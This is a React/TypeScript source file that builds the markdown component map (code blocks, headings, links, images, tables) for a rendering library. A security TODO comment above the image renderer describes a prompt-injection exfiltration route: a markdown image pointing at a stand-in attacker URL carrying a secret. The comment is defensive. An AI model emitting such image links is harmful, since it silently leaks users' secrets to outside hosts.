'use client';

/**
 * Default react-markdown component map for the unified markdown engine.
 * ONE implementation of code blocks, headings, links, lists, tables etc.
 * Compositions layer on top via `componentOverrides` (spread LAST by the
 * engine, so caller overrides always win).
 */
import type React from 'react';
import type { Components, ExtraProps } from 'react-markdown';
import Image from '../../../embed-shims/next-image';
import { useAuthedImageSrc } from '../../../hooks/use-authed-image-src';
import type { ResolveLinkResult } from '../../../types/doc-source';
import { cn } from '../../../utils/cn';
import { slugifyHeadingText } from '../../../utils/markdown-heading-id';
import { getHashTargetElement, navigateSamePageHash, HUB_HEADER_OFFSET_PX } from '../../../utils/same-page-hash-nav';
import { extractText, resolveFallbackHeadingId, useAssignedHeadingIds, useHeadingId } from './heading-ids';
import { MermaidDiagram } from './mermaid-diagram';
import type { TextSizeElement } from './text-size';

/**
 * Props react-markdown hands a renderer for `<Tag>`: the intrinsic element's
 * own props plus the hast `node` (react-markdown's `ExtraProps`). Mirrors the
 * `Components` map's own element typing, so every renderer below stays
 * assignable to it without a cast.
 *
 * NOTE: react-markdown dropped the `inline` prop in v9 — inline code is
 * distinguished by the absence of a `language-*` class, which is what the
 * `code` renderer already keys off.
 */
export type MdRenderProps<Tag extends keyof React.JSX.IntrinsicElements> = React.ComponentPropsWithoutRef<Tag> &
  ExtraProps;

/**
 * The shared leaf renderers, typed as plain functions (not `Components`
 * entries, which also admit a bare tag name). The rich composition CALLS
 * them directly — see the hook-free contract documented on
 * `buildStandardLeafRenderers` — so their call signature has to be part of
 * the type.
 */
export interface StandardLeafRenderers {
  code: (props: MdRenderProps<'code'>) => React.ReactElement;
  blockquote: (props: MdRenderProps<'blockquote'>) => React.ReactElement;
  div: (props: MdRenderProps<'div'>) => React.ReactElement;
}

/**
 * True when an image `src` is worth rendering. Shared by the base `img` and
 * the rich composition's `img` / `video` overrides so the empty-`![]()`
 * guard has exactly one definition.
 */
/**
 * Inline content image (blog / docs / chat attachments). A standalone
 * component — NOT inline JSX in the `img` renderer — because it must call
 * `useAuthedImageSrc`: in bearer-mode native shells (`capacitor://`,
 * `tauri://`) a gateway-hosted image can't load through a plain `<img>` (no
 * Authorization header on native asset loads), so the hook swaps in an authed
 * blob URL; everywhere else it returns `src` untouched. While the blob fetch
 * is in flight `resolvedSrc` is null and the component renders nothing — same
 * as the no-src case. Ported from #1548 into the unified engine (the original
 * lived in the now-deleted `ui/simple-markdown-renderer.tsx`). Sizing matches
 * the engine's cap: 400x400 intrinsic, `w-auto h-auto max-h-[400px]` drives
 * the actual rendered box; click-to-expand surfaces provide full resolution.
 */
const MarkdownContentImage: React.FC<{ src: string; alt?: string }> = ({ src, alt }) => {
  const resolvedSrc = useAuthedImageSrc(src);
  if (!resolvedSrc) return null;
  return (
    <Image
      src={resolvedSrc}
      alt={alt ?? 'No image available'}
      width={400}
      height={400}
      sizes="(max-width: 400px) 100vw, 400px"
      className="h-auto max-h-[400px] w-auto max-w-full rounded-lg object-contain"
      style={{ width: 'auto', height: 'auto' }}
    />
  );
};

export function hasRenderableSrc(src: unknown): src is string {
  return typeof src === 'string' && src.trim() !== '';
}

export interface BuildBaseComponentsOptions {
  textSizes: Record<TextSizeElement, string>;
  demoteMarkdownH1ToH2: boolean;
  brokenLinks: readonly string[];
  currentPath?: string;
  onInternalLinkClick?: (path: string, options?: { expandFolder?: boolean; fromInternalLink?: boolean }) => void;
  onResolveLink?: (href: string, currentPath: string) => Promise<ResolveLinkResult>;
}

/**
 * The standard leaf renderers (`code` block + inline, `blockquote`, `div`
 * pass-through) as standalone functions.
 *
 * SSOT for compositions that must OVERRIDE these renderers for a narrow
 * special case and then fall through: the rich composition intercepts embed
 * fence languages, shortcode-expanded `div`s and Reddit's `reddit-embed-bq`
 * blockquote, and delegates everything else here. Previously it reproduced
 * these renderers byte-for-byte, so any class change here silently drifted
 * on content surfaces.
 *
 * THESE MUST STAY HOOK-FREE: the rich composition calls them as plain
 * functions from inside its own renderers (`standard.code(props)`), which is
 * not a React render of a component and would break the rules of hooks.
 * Hook-using renderers (the headings, which read the heading-line offset
 * from context) live in `buildBaseComponents` below and are never delegated
 * to this way.
 *
 * ODS-TOKENS FLAG (ODS_TOKEN_RULES §Typography / §General): inline code keeps
 * an inline `text-[0.9em]`, carried over verbatim from the pre-unification
 * renderers — ODS has no relative-to-parent code size, so mapping it onto an
 * existing token would visibly change every inline code span. Same shape as
 * the flag in ./text-size.ts — flagged for addition to ODS, not copied
 * anywhere else.
 *
 * The code BLOCK's font is NOT flagged: the raw "JetBrains Mono", "SF Mono",
 * Consolas stack the old renderer inlined is gone, replaced by Tailwind's
 * `font-mono` (→ `var(--font-family-heading)`, the Azeret Mono ODS stack) —
 * the same class the inline-code branch below already used, so the two code
 * surfaces no longer disagree about their family.
 */
export function buildStandardLeafRenderers({
  textSizes,
}: {
  textSizes: Record<TextSizeElement, string>;
}): StandardLeafRenderers {
  return {
    code: ({ node, className: codeClassName, children, ...props }: MdRenderProps<'code'>) => {
      const match = /language-(\w+)/.exec(codeClassName || '');
      const language = match ? match[1] : '';

      if (language === 'mermaid') {
        return <MermaidDiagram chart={String(children).replace(/\n$/, '')} />;
      }

      if (match) {
        return (
          <div className="code-block-container my-6 overflow-hidden rounded-lg border border-ods-border bg-ods-card">
            <div className="code-header border-b border-ods-border bg-ods-card px-4 py-2">
              <span className="font-sans text-xs uppercase tracking-wide text-ods-text-tertiary">
                {language || 'code'}
              </span>
            </div>
            <div className="p-4">
              <pre className="overflow-x-auto">
                <code
                  className={cn(`language-${language} hljs font-mono`, textSizes.code)}
                  style={{
                    background: 'transparent',
                    color: 'var(--color-text-primary)',
                  }}
                  {...props}
                >
                  {children}
                </code>
              </pre>
            </div>
          </div>
        );
      }

      return (
        <code
          className="rounded border border-ods-border bg-ods-card px-1.5 py-0.5 font-mono text-[0.9em] text-ods-text-primary"
          {...props}
        >
          {children}
        </code>
      );
    },

    blockquote: ({ children }: MdRenderProps<'blockquote'>) => (
      <blockquote className="my-8 ml-0 rounded-r-lg border-l-4 border-ods-accent bg-ods-bg-surface py-4 pl-6">
        <div className={cn('font-sans leading-relaxed text-ods-text-secondary', textSizes.blockquote)}>{children}</div>
      </blockquote>
    ),

    // Pass-through `div` (overridable for embeds; `node` is dropped so it
    // never reaches the DOM).
    div: ({ node, className: divClassName, children, ...props }: MdRenderProps<'div'>) => (
      <div className={divClassName} {...props}>
        {children}
      </div>
    ),
  };
}

export function buildBaseComponents({
  textSizes,
  demoteMarkdownH1ToH2,
  brokenLinks,
  currentPath: propCurrentPath,
  onInternalLinkClick,
  onResolveLink,
}: BuildBaseComponentsOptions): Components {
  const makeHeading = (Tag: 'h1' | 'h2' | 'h3' | 'h4' | 'h5' | 'h6', headingClassName: string) => {
    function MarkdownHeading({ node, children }: MdRenderProps<'h1'>) {
      // PURE LOOKUP — no counters, no render-order dependency. The map is
      // built once from the processed source and reaches this renderer via
      // context (see ./heading-ids.ts for why not via this options object).
      const mapped = useHeadingId(node);
      const taken = useAssignedHeadingIds();
      // An AUTHORED anchor wins over everything. The sanitize schema allows
      // `id` on every element (and disables clobbering) precisely so
      // `<h2 id="pricing-faq">` keeps its hand-picked anchor; overwriting it
      // with the slug of its text silently broke every existing deep link
      // pointing at it.
      const explicit =
        typeof node?.properties?.id === 'string' && node.properties.id !== '' ? node.properties.id : undefined;
      // Fallback for headings the source scan cannot see — in practice only
      // caller-plugin-synthesized nodes, which carry no source position.
      // Deduped against the ids the map already assigned (pure — see
      // resolveFallbackHeadingId).
      const id = explicit ?? mapped ?? resolveFallbackHeadingId(slugifyHeadingText(extractText(children)), taken);
      const EffectiveTag = Tag === 'h1' && demoteMarkdownH1ToH2 ? 'h2' : Tag;
      return (
        <EffectiveTag id={id || undefined} className={headingClassName}>
          {children}
        </EffectiveTag>
      );
    }
    // Named so React DevTools and error boundaries show `MarkdownHeading(h2)`
    // instead of an anonymous frame for every heading in a document.
    MarkdownHeading.displayName = `MarkdownHeading(${Tag})`;
    return MarkdownHeading;
  };

  return {
    // --- code + blockquote + div (shared leaf renderers, see above) ---
    ...buildStandardLeafRenderers({ textSizes }),

    // --- headings ---
    h1: makeHeading('h1', cn('mb-4 mt-8 font-sans font-bold text-ods-text-primary first:mt-0', textSizes.h1)),
    h2: makeHeading(
      'h2',
      cn('mb-4 mt-8 border-b border-ods-border pb-2 font-sans font-semibold text-ods-text-primary', textSizes.h2),
    ),
    h3: makeHeading('h3', cn('mb-3 mt-6 font-sans font-semibold text-ods-text-primary', textSizes.h3)),
    h4: makeHeading('h4', cn('mb-2 mt-4 font-sans font-semibold text-ods-text-primary', textSizes.h4)),
    h5: makeHeading('h5', cn('mb-2 mt-3 font-sans font-semibold text-ods-text-primary', textSizes.h5)),
    h6: makeHeading('h6', cn('mb-1 mt-3 font-sans font-semibold text-ods-text-primary', textSizes.h6)),

    // --- paragraph ---
    p: ({ children }: MdRenderProps<'p'>) => (
      <p className={cn('mb-4 leading-relaxed text-ods-text-primary first:mt-0 last:mb-0', textSizes.p)}>{children}</p>
    ),

    // --- links ---
    a: ({ href, children, className: linkClassName }: MdRenderProps<'a'>) => {
      const isBroken = href !== undefined && brokenLinks.includes(href);
      const isInternalDocLink =
        propCurrentPath !== undefined &&
        propCurrentPath !== null &&
        !!href &&
        !href.startsWith('http') &&
        !href.startsWith('#');

      if (isBroken) {
        return (
          <span className="cursor-not-allowed text-ods-accent">
            {children}
            <sup className="ml-1 text-xs font-bold text-ods-error">[BROKEN]</sup>
          </span>
        );
      }

      if (isInternalDocLink && onInternalLinkClick) {
        const currentPath = propCurrentPath ?? '';
        return (
          <span
            className="relative cursor-pointer text-ods-accent no-underline transition-colors duration-200 after:absolute after:-bottom-0.5 after:left-0 after:h-0.5 after:w-0 after:bg-ods-accent after:transition-all after:duration-300 after:content-[''] hover:after:w-full"
            onClick={async e => {
              e.preventDefault();
              e.stopPropagation();
              if (onResolveLink) {
                try {
                  const result = await onResolveLink(href, currentPath);
                  if (result.type === 'folder-no-readme' && result.action === 'expand_folder') {
                    // `resolvedPath` is optional on `ResolveLinkResult` — the
                    // endpoint's discriminators are plain strings, so an
                    // expand_folder result with no path is a shape the wire
                    // permits. Skip rather than navigating to `undefined`
                    // (which is what the previous assertion did).
                    if (result.resolvedPath) {
                      onInternalLinkClick(result.resolvedPath, { expandFolder: true, fromInternalLink: true });
                    }
                  } else if (result.type === 'not-found') {
                    return;
                  } else if (result.success && result.resolvedPath) {
                    onInternalLinkClick(result.resolvedPath, { fromInternalLink: true });
                  }
                } catch (error) {
                  console.error('Error resolving link:', error);
                }
              } else {
                onInternalLinkClick(href, { fromInternalLink: true });
              }
            }}
            role="link"
            tabIndex={0}
            onKeyDown={e => {
              if (e.key === 'Enter' || e.key === ' ') {
                e.currentTarget.click();
              }
            }}
          >
            {children}
          </span>
        );
      }

      // In-page anchor. Doc TOCs are authored against GitHub's slugger
      // (`## 📚 Table of Contents` → `#-table-of-contents`) while our heading
      // ids trim the emoji's leftover hyphen, so the raw href resolves to
      // nothing and the browser silently ignores the click. Resolve through
      // `getHashTargetElement` — the same resolver deep links use — then hand
      // the real id to the canonical hash-nav helper, which also lands the
      // heading BELOW the sticky header instead of under it, matching how the
      // "On this page" rail scrolls.
      const inPageAnchorId = typeof href === 'string' && href.startsWith('#') && href.length > 1 ? href.slice(1) : null;
      const handleAnchorClick = (e: React.MouseEvent<HTMLAnchorElement>) => {
        if (inPageAnchorId === null) return;
        // Let modifier / non-primary clicks keep their native behavior.
        if (e.metaKey || e.ctrlKey || e.shiftKey || e.altKey || e.button !== 0) return;
        const target = getHashTargetElement(inPageAnchorId);
        // Nothing matched anywhere in the document → leave the browser's
        // default alone rather than swallowing a click that isn't ours.
        if (!target?.id) return;
        e.preventDefault();
        navigateSamePageHash(`#${target.id}`, { headerOffset: HUB_HEADER_OFFSET_PX });
      };

      return (
        <a
          href={href}
          className={`relative text-ods-accent no-underline transition-colors duration-200 after:absolute after:-bottom-0.5 after:left-0 after:h-0.5 after:w-0 after:bg-ods-accent after:transition-all after:duration-300 after:content-[''] hover:after:w-full ${linkClassName || ''}`}
          target={href?.startsWith('http') ? '_blank' : undefined}
          rel={href?.startsWith('http') ? 'noopener noreferrer' : undefined}
          onClick={inPageAnchorId !== null ? handleAnchorClick : undefined}
        >
          {children}
        </a>
      );
    },

    // --- images ---
    // Inline content image renderer (blog, docs, chat attachments) —
    // delegates to `MarkdownContentImage` (above), which handles bearer-mode
    // authed loading for native shells and the 400x400 cap with click-to-
    // expand for full resolution.
    //
    // TODO(security): LLM-rendered surfaces still auto-load ANY image origin,
    // so a prompt-injected `![](https://attacker/log?d=<secret>)` exfiltrates
    // silently. An image-origin allowlist is a tracked follow-up: it requires
    // a host-supplied origin list threaded from each chat composition (there
    // is no safe default this library can pick), so it is deliberately absent
    // rather than shipped unwired.
    img: ({ src, alt }: MdRenderProps<'img'>) => {
      if (!hasRenderableSrc(src)) return null;
      return <MarkdownContentImage src={src} alt={alt} />;
    },

    // --- lists ---
    ul: ({ children }: MdRenderProps<'ul'>) => (
      <ul className="my-4 ml-8 list-outside list-disc space-y-2 text-ods-text-primary">{children}</ul>
    ),
    ol: ({ children }: MdRenderProps<'ol'>) => (
      <ol className="my-4 ml-8 list-outside list-decimal space-y-2 text-ods-text-primary">{children}</ol>
    ),
    li: ({ children }: MdRenderProps<'li'>) => <li className={cn('pl-2 leading-relaxed', textSizes.li)}>{children}</li>,

    // --- tables ---
    table: ({ children }: MdRenderProps<'table'>) => (
      <div className="table-container my-6 overflow-x-auto">
        <div className="min-w-full rounded-lg border border-ods-border bg-ods-card">
          <table className="w-full table-fixed md:table-auto">{children}</table>
        </div>
      </div>
    ),
    thead: ({ children }: MdRenderProps<'thead'>) => <thead className="bg-ods-bg-surface">{children}</thead>,
    th: ({ children }: MdRenderProps<'th'>) => (
      <th
        className={cn(
          'break-words border-r border-ods-border px-2 py-3 text-left font-semibold text-ods-accent last:border-r-0 md:px-4',
          textSizes.th,
        )}
      >
        {children}
      </th>
    ),
    td: ({ children }: MdRenderProps<'td'>) => (
      <td
        className={cn(
          'whitespace-normal break-words border-b border-r border-ods-border px-2 py-3 text-ods-text-primary last:border-r-0 md:px-4',
          textSizes.td,
        )}
      >
        {children}
      </td>
    ),

    // --- horizontal rule ---
    hr: () => <hr className="my-8 border-0 border-t border-ods-border" />,
  };
}
